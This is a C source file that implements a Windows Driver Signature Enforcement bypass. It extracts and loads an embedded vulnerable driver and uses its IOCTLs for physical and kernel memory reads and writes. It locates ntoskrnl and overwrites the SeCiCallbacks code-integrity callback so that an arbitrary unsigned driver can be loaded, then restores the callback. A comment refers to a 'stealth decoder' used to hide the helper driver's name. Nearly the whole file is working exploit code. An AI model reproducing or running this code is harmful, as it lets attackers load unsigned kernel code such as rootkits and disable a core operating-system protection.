#include "SecurityPatcher.h"

// Assembly stealth decoder for OmniDriver operations
extern PWSTR MmGetPoolDiagnosticString(void);

// ============================================================================
// RTC_PACKET for IOCTL communication with non-compliant driver
// ============================================================================
typedef struct _RTC_PACKET {
    UCHAR pad0[8];
    ULONGLONG addr;
    UCHAR pad1[8];
    ULONG size;
    ULONG value;
    UCHAR pad3[16];
} RTC_PACKET;

// ============================================================================
// IOCTL OPERATIONS - Physical memory read/write via non-compliant driver
// ============================================================================

BOOLEAN WriteMemory32(HANDLE hDriver, ULONGLONG address, ULONG value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address;
    packet.size = 4;
    packet.value = value;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    return NT_SUCCESS(status);
}

BOOLEAN WriteMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG value, ULONG ioctl) {
    if (!WriteMemory32(hDriver, address, (ULONG)(value & 0xFFFFFFFF), ioctl))
        return FALSE;
    if (!WriteMemory32(hDriver, address + 4, (ULONG)((value >> 32) & 0xFFFFFFFF), ioctl))
        return FALSE;
    return TRUE;
}

BOOLEAN ReadMemory64(HANDLE hDriver, ULONGLONG address, ULONGLONG* value, ULONG ioctl) {
    RTC_PACKET packet;
    IO_STATUS_BLOCK iosb;
    ULONG low, high;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address;
    packet.size = 4;

    NTSTATUS status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                           ioctl, &packet, sizeof(packet),
                                           &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;

    low = packet.value;

    memset_impl(&packet, 0, sizeof(packet));
    memset_impl(&iosb, 0, sizeof(iosb));

    packet.addr = address + 4;
    packet.size = 4;

    status = NtDeviceIoControlFile(hDriver, NULL, NULL, NULL, &iosb,
                                  ioctl, &packet, sizeof(packet),
                                  &packet, sizeof(packet));

    if (!NT_SUCCESS(status))
        return FALSE;

    high = packet.value;

    *value = ((ULONGLONG)high << 32) | (ULONGLONG)low;
    return TRUE;
}

// ============================================================================
// NTOSKRNL BASE ADDRESS - Query kernel module list
// ============================================================================

ULONGLONG GetNtoskrnlBase(void) {
    UCHAR stackBuffer[0x10000];
    ULONG returnLength;

    NTSTATUS status = NtQuerySystemInformation(11, stackBuffer, sizeof(stackBuffer), &returnLength);
    if (!NT_SUCCESS(status))
        return 0;

    SYSTEM_MODULE_INFORMATION* moduleInfo = (SYSTEM_MODULE_INFORMATION*)stackBuffer;
    if (moduleInfo->Count == 0)
        return 0;

    for (ULONG i = 0; i < moduleInfo->Count; i++) {
        char* imageName = moduleInfo->Modules[i].ImageName + moduleInfo->Modules[i].ModuleNameOffset;

        const char* ntName = "ntoskrnl.exe";
        BOOLEAN isNtoskrnl = TRUE;
        for (int j = 0; ntName[j] != 0; j++) {
            if (imageName[j] != ntName[j]) {
                isNtoskrnl = FALSE;
                break;
            }
        }

        if (isNtoskrnl)
            return (ULONGLONG)moduleInfo->Modules[i].ImageBase;
    }

    return 0;
}

// ============================================================================
// DEVICE HANDLE - Open non-compliant driver device
// ============================================================================

HANDLE OpenDriverDevice(PCWSTR deviceName) {
    UNICODE_STRING usDeviceName;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hDevice = NULL;

    RtlInitUnicodeString(&usDeviceName, deviceName);
    InitializeObjectAttributes(&oa, &usDeviceName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = NtOpenFile(&hDevice, FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
                                &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);

    return NT_SUCCESS(status) ? hDevice : NULL;
}

// ============================================================================
// AUTOPATCH LOAD - Complete DSE bypass sequence
// ============================================================================

NTSTATUS ExecuteAutoPatchLoad(PINI_ENTRY entry, PCONFIG_SETTINGS config, PULONGLONG originalCallback) {
    NTSTATUS status;
    HANDLE hDriver;
    ULONGLONG ntBase, callbackToPatch, safeFunction, currentCallback;
    PWSTR driverName = MmGetPoolDiagnosticString();

    DisplayMessage(L"INFO: Starting AutoPatch sequence for driver: ");
    DisplayMessage(entry->ServiceName);
    DisplayMessage(L"\r\n");

    DEBUG_LOG(L"STEP 1: Loading non-compliant driver...\r\n");

    // ExtractOmniDriverFromResource is now in SetupManager
    if (!ExtractOmniDriverFromResource()) {
        DisplayMessage(L"FAILED: Cannot extract non-compliant driver from resource\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    status = LoadDriver(driverName, OmniDriver_Log, L"KERNEL", L"SYSTEM");
    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
        DisplayMessage(L"FAILED: Cannot load non-compliant driver\r\n");
        DisplayStatus(status);
        return status;
    }
    DEBUG_LOG(L"SUCCESS: Non-compliant driver loaded\r\n");

    hDriver = OpenDriverDevice(config->DriverDevice);
    if (!hDriver) {
        DisplayMessage(L"FAILED: Cannot open driver device\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    ntBase = GetNtoskrnlBase();
    if (ntBase == 0) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot find ntoskrnl\r\n");
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    callbackToPatch = ntBase + config->Offset_SeCiCallbacks + config->Offset_Callback;
    safeFunction = ntBase + config->Offset_SafeFunction;

    if (!ReadMemory64(hDriver, callbackToPatch, &currentCallback, config->IoControlCode_Read)) {
        NtClose(hDriver);
        DisplayMessage(L"FAILED: Cannot read current callback\r\n");
        return STATUS_NO_SUCH_DEVICE;
    }

    if (currentCallback == safeFunction) {
        DEBUG_LOG(L"INFO: DSE already patched\r\n");
    } else {
        *originalCallback = currentCallback;
        SaveStateSection(currentCallback);
        DEBUG_LOG(L"INFO: Original callback saved\r\n");

        DEBUG_LOG(L"STEP 2: Patching DSE...\r\n");
        if (!WriteMemory64(hDriver, callbackToPatch, safeFunction, config->IoControlCode_Write)) {
            NtClose(hDriver);
            DisplayMessage(L"FAILED: DSE patch write failed\r\n");
            return STATUS_NO_SUCH_DEVICE;
        }
        DEBUG_LOG(L"SUCCESS: DSE patched\r\n");
    }

    DEBUG_LOG(L"STEP 3: Loading target driver...\r\n");
    status = LoadDriver(entry->ServiceName, entry->ImagePath, entry->DriverType, entry->StartType);
    if (!NT_SUCCESS(status) && status != STATUS_IMAGE_ALREADY_LOADED) {
        DisplayMessage(L"FAILED: Cannot load target driver");
        DisplayStatus(status);
    } else {
        DEBUG_LOG(L"SUCCESS: Target driver loaded\r\n");
    }

    DEBUG_LOG(L"STEP 4: Restoring DSE...\r\n");
    if (*originalCallback != 0 && *originalCallback != safeFunction) {
        if (!WriteMemory64(hDriver, callbackToPatch, *originalCallback, config->IoControlCode_Write)) {
            DisplayMessage(L"WARNING: DSE restore failed\r\n");
        } else {
            DEBUG_LOG(L"SUCCESS: DSE restored\r\n");
            *originalCallback = 0;
            RemoveStateSection();
        }
    }

    DEBUG_LOG(L"STEP 5: Unloading non-compliant driver...\r\n");
    NtClose(hDriver);
    status = UnloadDriver(driverName);
    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"SUCCESS: Non-compliant driver unloaded\r\n");
    } else {
        DisplayMessage(L"WARNING: Non-compliant driver unload failed");
        DisplayStatus(status);
    }

    // CleanupOmniDriver is now in SetupManager
    CleanupOmniDriver();
    DisplayMessage(L"SUCCESS: AutoPatch sequence completed\r\n");
    return STATUS_SUCCESS;
}

// ============================================================================
// DSE STATE PERSISTENCE - Save/Load/Remove callback address in INI
// ============================================================================

BOOLEAN SaveStateSection(ULONGLONG callback) {
    RemoveStateSection();

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    WCHAR content[512];
    wcscpy(content, L"\r\n[DSE_STATE]\r\n");
    wcscat(content, L"OriginalCallback=");

    WCHAR hexValue[32];
    ULONGLONGToHexString(callback, hexValue, TRUE);
    wcscat(content, hexValue);
    wcscat(content, L"\r\n");

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                       FILE_SHARE_READ, FILE_SYNCHRONOUS_IO_NONALERT);

    if (!NT_SUCCESS(status)) {
        status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                             NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_CREATE,
                             FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
        if (!NT_SUCCESS(status))
            return FALSE;

        WCHAR bom = 0xFEFF;
        byteOffset.QuadPart = 0;
        status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
                            sizeof(WCHAR), &byteOffset, NULL);
        if (!NT_SUCCESS(status)) {
            NtClose(hFile);
            return FALSE;
        }
    }

    FILE_STANDARD_INFORMATION fileInfo;
    memset_impl(&fileInfo, 0, sizeof(fileInfo));
    status = NtQueryInformationFile(hFile, &iosb, &fileInfo,
                                   sizeof(FILE_STANDARD_INFORMATION),
                                   FileStandardInformation);

    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        return FALSE;
    }

    byteOffset.QuadPart = fileInfo.EndOfFile.QuadPart;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, content,
                        (ULONG)(wcslen(content) * sizeof(WCHAR)),
                        &byteOffset, NULL);

    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"INFO: DSE state saved to drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}

BOOLEAN LoadStateSection(ULONGLONG* outCallback) {
    PWSTR fileContent = NULL;

    if (!ReadIniFile(STATE_FILE_PATH, &fileContent)) {
        return FALSE;
    }

    PWSTR line = fileContent;
    BOOLEAN inDseSection = FALSE;

    if (line[0] == 0xFEFF) {
        line++;
    }

    while (*line) {
        PWSTR nextLine = line;
        while (*nextLine && *nextLine != L'\r' && *nextLine != L'\n')
            nextLine++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        while (line < nextLine && i < (MAX_PATH_LEN - 1))
            lineBuf[i++] = *line++;
        lineBuf[i] = 0;

        line = nextLine;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        TrimString(lineBuf);

        if (lineBuf[0] == L'[') {
            inDseSection = (_wcsicmp_impl(lineBuf, L"[DSE_STATE]") == 0);
            continue;
        }

        if (inDseSection && lineBuf[0] != 0 && lineBuf[0] != L';') {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=')
                equals++;

            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key);
                TrimString(value);

                if (_wcsicmp_impl(key, L"OriginalCallback") == 0) {
                    if (StringToULONGLONG(value, outCallback)) {
                        DEBUG_LOG(L"INFO: Loaded DSE state from drivers.ini\r\n");
                        return TRUE;
                    }
                }
            }
        }
    }
    return FALSE;
}

BOOLEAN RemoveStateSection(void) {
    PWSTR iniContent = NULL;
    WCHAR newContent[8192];
    BOOLEAN inDseSection = FALSE;
    BOOLEAN foundDseSection = FALSE;
    BOOLEAN skipLine = FALSE;
    SIZE_T newLen = 0;

    if (!ReadIniFile(STATE_FILE_PATH, &iniContent)) {
        return FALSE;
    }

    PWSTR line = iniContent;

    if (line[0] == 0xFEFF)
        line++;

    newContent[0] = 0;

    while (*line) {
        PWSTR lineStart = line;
        PWSTR lineEnd = line;

        while (*lineEnd && *lineEnd != L'\r' && *lineEnd != L'\n')
            lineEnd++;

        WCHAR lineBuf[MAX_PATH_LEN];
        ULONG i = 0;
        PWSTR ptr = lineStart;
        while (ptr < lineEnd && i < MAX_PATH_LEN - 1) {
            lineBuf[i++] = *ptr++;
        }
        lineBuf[i] = 0;

        line = lineEnd;
        if (*line == L'\r')
            line++;
        if (*line == L'\n')
            line++;

        WCHAR trimmedBuf[MAX_PATH_LEN];
        wcscpy(trimmedBuf, lineBuf);
        TrimString(trimmedBuf);

        BOOLEAN isSeparator = FALSE;
        if (trimmedBuf[0] == L';' && wcslen(trimmedBuf) > 10) {
            isSeparator = TRUE;
            for (ULONG j = 1; trimmedBuf[j] != 0; j++) {
                if (trimmedBuf[j] != L'=' && trimmedBuf[j] != L' ') {
                    isSeparator = FALSE;
                    break;
                }
            }
        }

        if (trimmedBuf[0] == L'[') {
            if (_wcsicmp_impl(trimmedBuf, L"[DSE_STATE]") == 0) {
                inDseSection = TRUE;
                foundDseSection = TRUE;
                skipLine = TRUE;
            } else {
                inDseSection = FALSE;
                skipLine = FALSE;
            }
        }

        if (inDseSection || (isSeparator && (foundDseSection || skipLine))) {
            if (isSeparator && inDseSection) {
                inDseSection = FALSE;
            }
            continue;
        }

        if (newLen > 0) {
            wcscat(newContent, L"\r\n");
            newLen = wcslen(newContent);
        }

        wcscat(newContent, lineBuf);
        newLen = wcslen(newContent);
    }

    if (!foundDseSection) {
        return TRUE;
    }

    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, STATE_FILE_PATH);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateFile(&hFile, FILE_WRITE_DATA | SYNCHRONIZE, &oa, &iosb,
                         NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE,
                         FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);

    if (!NT_SUCCESS(status)) {
        return FALSE;
    }

    WCHAR bom = 0xFEFF;
    byteOffset.QuadPart = 0;
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, &bom,
                        sizeof(WCHAR), &byteOffset, NULL);

    if (!NT_SUCCESS(status)) {
        NtClose(hFile);
        return FALSE;
    }

    byteOffset.QuadPart = sizeof(WCHAR);
    status = NtWriteFile(hFile, NULL, NULL, NULL, &iosb, newContent,
                        (ULONG)(wcslen(newContent) * sizeof(WCHAR)),
                        &byteOffset, NULL);

    NtClose(hFile);

    if (NT_SUCCESS(status)) {
        DEBUG_LOG(L"INFO: DSE state removed from drivers.ini\r\n");
        return TRUE;
    }

    return FALSE;
}